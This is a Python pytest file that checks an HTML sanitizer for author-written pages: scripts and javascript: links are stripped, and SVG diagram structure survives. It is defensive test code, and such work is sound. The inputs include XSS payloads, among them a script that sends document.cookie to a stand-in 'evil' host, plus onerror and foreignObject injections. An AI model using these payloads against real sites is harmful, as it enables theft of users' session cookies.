"""HTML pages are author-controlled and rendered for public viewers in a
sandboxed iframe with allow-scripts. We sanitize on write so a page can't ship
hostile JS. These tests pin that contract at the service boundary."""

from __future__ import annotations

import hashlib
from uuid import uuid4

import pytest
import pytest_asyncio

from backend.services import files_tree_service


@pytest_asyncio.fixture
async def scope(_db_pool):
    user_id = uuid4()
    await _db_pool.execute(
        "INSERT INTO users (id, name, display_name) VALUES ($1, $2, $2)",
        user_id,
        f"u_{user_id.hex[:6]}",
    )
    # The user IS the scope: content is owned by owner_user_id = user_id.
    return user_id, user_id


@pytest.mark.asyncio
async def test_create_page_strips_scripts_keeps_structure(scope, _db_pool):
    scope_id, user_id = scope
    hostile = (
        '<section class="slide" data-slide="1">'
        "<h1>Deck</h1>"
        '<span data-comment-id="c1">noted</span>'
        '<img src="data:image/png;base64,AAAA">'
        '<a href="javascript:steal()">x</a>'
        "<style>.slide{color:red}</style>"
        "<script>fetch('//evil/'+document.cookie)</script>"
        "</section>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Deck",
        created_by=user_id,
        content_type="html",
        content_html=hostile,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    # Hostile bits gone.
    assert "<script" not in stored and "fetch(" not in stored
    assert "javascript:" not in stored
    # Legitimate structure, styling, comment anchor, and inline image survive.
    assert 'data-slide="1"' in stored and 'class="slide"' in stored
    assert "<style>.slide{color:red}</style>" in stored
    assert 'data-comment-id="c1"' in stored
    assert "data:image/png;base64,AAAA" in stored


@pytest.mark.asyncio
async def test_inline_svg_keeps_geometry(scope, _db_pool):
    """Diagrams ship as inline SVG. The shapes' geometry and paint live in
    attributes (viewBox, d, x/y, fill, marker-end) — if the sanitizer keeps the
    tags but drops those, every shape collapses and the diagram renders blank.
    html5ever preserves camelCase for SVG attrs, so the allowlist must too."""
    scope_id, user_id = scope
    diagram = (
        '<svg viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg">'
        '<defs><marker id="a" markerWidth="9" refX="7" orient="auto">'
        '<path d="M0,0 L7,3 L0,6 Z" fill="#5b6672"/></marker></defs>'
        '<rect x="16" y="20" width="80" height="40" rx="10" fill="#fff" stroke="#ccc"/>'
        '<path d="M100 40 L160 40" stroke="#c026d3" marker-end="url(#a)"/>'
        '<text x="30" y="45" font-size="11" text-anchor="middle">Brain</text>'
        "</svg>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Diagram",
        created_by=user_id,
        content_type="html",
        content_html=diagram,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    for attr in ('viewBox="0 0 200 100"', 'refX="7"', 'markerWidth="9"'):
        assert attr in stored  # camelCased foreign attrs survive with casing intact
    for attr in ('d="M100 40 L160 40"', 'x="16"', 'rx="10"', 'marker-end="url(#a)"'):
        assert attr in stored  # geometry + paint survive
    assert "<marker" in stored and "<defs" in stored


@pytest.mark.asyncio
async def test_inline_svg_keeps_defs_referenced_by_url(scope, _db_pool):
    """Real exporters lean on <mask>, <pattern>, <filter>, <use>/<symbol> and
    <image>. Dropping a container is worse than dropping a leaf: nh3 keeps a
    stripped tag's CHILDREN, so a discarded <mask> repainted its shapes on top
    of the diagram, and a discarded <symbol> duplicated every icon."""
    scope_id, user_id = scope
    diagram = (
        '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">'
        "<defs>"
        '<symbol id="ic"><path d="M0 0 L4 4"/></symbol>'
        '<mask id="m"><rect width="10" height="10" fill="#fff"/></mask>'
        '<pattern id="p" patternUnits="userSpaceOnUse"><rect width="2" height="2"/></pattern>'
        '<filter id="f"><feGaussianBlur stdDeviation="2"/></filter>'
        "</defs>"
        '<use href="#ic"/>'
        '<rect width="50" height="50" mask="url(#m)" fill="url(#p)" filter="url(#f)"/>'
        '<image href="https://cdn.example/chart.png" width="20" height="20"/>'
        "</svg>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Rich diagram",
        created_by=user_id,
        content_type="html",
        content_html=diagram,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    for tag in ("<symbol", "<use", "<mask", "<pattern", "<filter", "<feGaussianBlur", "<image"):
        assert tag in stored, f"{tag} was stripped — its children would paint over the diagram"
    for attr in ('mask="url(#m)"', 'fill="url(#p)"', 'filter="url(#f)"', 'stdDeviation="2"'):
        assert attr in stored


@pytest.mark.asyncio
async def test_foreign_object_is_never_allowed(scope, _db_pool):
    """<foreignObject> re-opens the HTML namespace inside SVG — the exact
    escape hatch the SVG allowlist exists to close. Widening the allowlist for
    diagram fidelity must never let it back in."""
    scope_id, user_id = scope
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Hostile diagram",
        created_by=user_id,
        content_type="html",
        content_html=(
            '<svg><foreignObject><img src=x onerror="alert(1)"></foreignObject>'
            '<use href="javascript:alert(1)"/></svg>'
        ),
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    assert "foreignObject" not in stored
    assert "onerror" not in stored
    assert "javascript:" not in stored


@pytest.mark.asyncio
async def test_title_text_does_not_leak_into_body(scope, _db_pool):
    """A full HTML document carries a <title>. nh3 drops the (disallowed) tag,
    but without clean_content_tags it would keep the title's text and render it
    as unstyled body text. The author's <style> must still survive."""
    scope_id, user_id = scope
    doc = (
        "<!doctype html><html><head>"
        "<title>Gong Analysis · Acme Corp</title>"
        "<style>h1{font-family:Fraunces}</style>"
        "</head><body><h1>Report</h1></body></html>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Doc",
        created_by=user_id,
        content_type="html",
        content_html=doc,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    # The title text must be gone entirely — not left as a bare body text node.
    assert "Gong Analysis" not in stored
    # Author styling and real content are untouched.
    assert "font-family:Fraunces" in stored
    assert "<h1>Report</h1>" in stored


@pytest.mark.asyncio
async def test_content_hash_matches_sanitized_bytes(scope, _db_pool):
    """The stored content_hash must be computed from the sanitized body, so the
    optimistic-concurrency guard on the next edit doesn't spuriously conflict."""
    scope_id, user_id = scope
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Hashed",
        created_by=user_id,
        content_type="html",
        content_html="<p>ok</p><script>bad()</script>",
    )
    row = await _db_pool.fetchrow(
        "SELECT content_html, content_hash FROM pages WHERE id = $1", page["id"]
    )
    active = files_tree_service._active_content("html", "", row["content_html"])
    assert row["content_hash"] == hashlib.sha256(active.encode()).hexdigest()


@pytest.mark.asyncio
async def test_update_page_sanitizes_html(scope, _db_pool):
    scope_id, user_id = scope
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Live",
        created_by=user_id,
        content_type="html",
        content_html="<p>clean</p>",
    )
    await files_tree_service.update_page(
        page_id=page["id"],
        owner_user_id=scope_id,
        updated_by=user_id,
        content_html="<p>updated</p><script>evil()</script>",
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    assert "updated" in stored
    assert "<script" not in stored and "evil()" not in stored
